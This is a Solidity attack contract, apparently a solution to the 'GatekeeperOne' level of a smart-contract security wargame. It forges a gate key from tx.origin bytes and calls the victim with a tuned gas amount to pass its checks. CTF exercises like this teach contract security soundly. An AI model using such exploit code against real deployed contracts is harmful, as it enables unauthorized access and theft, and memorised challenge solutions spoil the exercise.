// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;

import "./GatekeeperOne.sol";

import "hardhat/console.sol";

contract Solution17 {
    GatekeeperOne public victim;

    constructor(GatekeeperOne victim_) {
        victim = victim_;
    }

    function attack() external {

        // tx.origin 0x70997970c51812dc3a010c7d01b50e0d17dc79c8
        //
        // 1. we need bytes8 array '70997970c51812dc'
        // 2. we need uint32 same as uint16 -> '70997970 0000 12dc' zero out uint32 part
        // 3. we need uint32 diff from uint64 -> 'FFFFFFFF 0000 12dc' lets make sure uint64 part not zero
        // 4. we need uint16 from tx.origin ->  'FFFFFFFF 0000 79c8'

        bytes memory modifiedArray = abi.encodePacked(tx.origin); //based on tx.origin values

        modifiedArray[0] = 0xFF;
        modifiedArray[1] = 0xFF;
        modifiedArray[2] = 0xFF;
        modifiedArray[3] = 0xFF;
        modifiedArray[4] = 0;
        modifiedArray[5] = 0;
        modifiedArray[6] = modifiedArray[18];
        modifiedArray[7] = modifiedArray[19];

        bytes8 gateKey = bytes8(modifiedArray);
        victim.enter{gas: 8191 * 10 + 423}(gateKey); //423 gas value checked in remix
    }
}
